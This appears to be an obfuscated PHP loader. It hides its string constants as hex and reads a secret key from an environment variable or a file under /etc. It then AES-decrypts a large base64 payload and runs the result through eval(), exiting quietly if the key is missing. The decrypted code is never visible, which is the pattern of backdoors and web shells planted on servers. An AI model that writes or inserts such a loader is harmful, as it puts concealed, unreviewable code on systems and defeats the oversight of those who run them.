<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gEfXaeBFF71+Kg70mGz0jA==');

$c=base64_decode(

'iE4BDVl4pezgiC/vKJ30rfEEpG96l8vJYv33TH07M80U3hCh/lN1Z3fWaUfYGlPakrVywCkGnTBn' .
'G3cz1/WqIIA1TVa61ydeo+2Xl04zD5psdTvQ5UeZ83ZYoziycbxZriuiCMwt78q8xEfzRoHuN+eD' .
'Hp57SK/3qkrm2Lx86jBtTxrUjwXPEDL0s3yr60s/FlpKMlJDnoNBS2M0UwS5M9IJAPRprpgNW2Ek' .
'QbiT55PLGES5GMjRjIU5nEAc+b+uL1OSbgsLFw5/n+RT1JyGzryd5gaNWKaS2JBJ9GgEzhue3oaZ' .
'imNxJ5GbhHCFnzeSxm9YOJx0pEQxbBLwpf7d3CnKPzywcaGVuWijQY50Y8gWv2PTI8rAcv3bZBHb' .
'ZtRFesvg/h3EVchsR7K9CVZ8Bn0RHE8rkVau6xyN6TW3ofMcPwPINGu3JSESbUH+U9wLpfQwIwjy' .
'VSEXzHinAfLzUSohLkxFE/rGpL0P1eyzF+3RUT5ZliTbayyUBJ9iSj8/ZAf6S/9pYEznJ6FSi/Wh' .
'DI2c++vt8htMBlfZpvj0uqgFs/fEVc9Zm56109UFyNlvyc26hRTjL3HU/houS2Bl5RisOGhzdJNa' .
'E5vQ/4AR2uI+MqH331kXeLEMCpdQacl/bWj3ZjJtcdC/MkA5FZK3A/8MK31WhC8DoOtXp/vsnFt/' .
'YpVwXr4OMfU80NZgPrtQq+CAEVLid/ylbt9x5EIy/aB3favLz5Zw1sFkT260lwtyYeUDxJA6Fbvp' .
'galMhKYFvCxlPqTnVkJhw+8AYDlI2TUyJ9x0ooMThDYV5EeUpeS/f5nUkK9WMb78SYVdSJFZGl3A' .
'F4E+b7p9k6Swso2tU+44Z8jgY/y/7rUYlKo0IMczVyn5/rKw0qw+LJ6oUp3IKbWup6kNZW9xvwhS' .
'MsOMr5bq7U49fkwWusOfqwTDFwAm1TA2nysyd1XW5SrhwAM/b5By6Xrix5g1vSADlnGxR1MyZiEX' .
'2LJmQkWBDn7GFs9g00tfyGB95CQWTP/bA2TcaQES/AdINiDmWc5/+3C8D+Ajh92MHaQld2y663PB' .
'wVg4z49NxNGk0IiZDvOuiuE6KchVdJIVcCs/c4obymaWJnX6W2dMIGi+XAvpEycEFWBCR4Vn9lRx' .
'UvvntehDki6vgMHE5ZHws8djZH3n2uWZbKo55hr8Q95Ht1deWnsWMJy29A9WoZUd/MBtlI4rQTqT' .
'o9UYmEJ04YoegNabtPEpl7JxXyPRAsAGD5U5RSEmc5j8oYnv6vIIcxZHUY6ZxwPH1itQwTVDhS2H' .
'ji5zELS0fdkogXgMLlrlgHvycGbOyINgq+0jjsBd1Ts5edkvUAQNqTsaN/up1qHdEZrLgVh5Ug=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

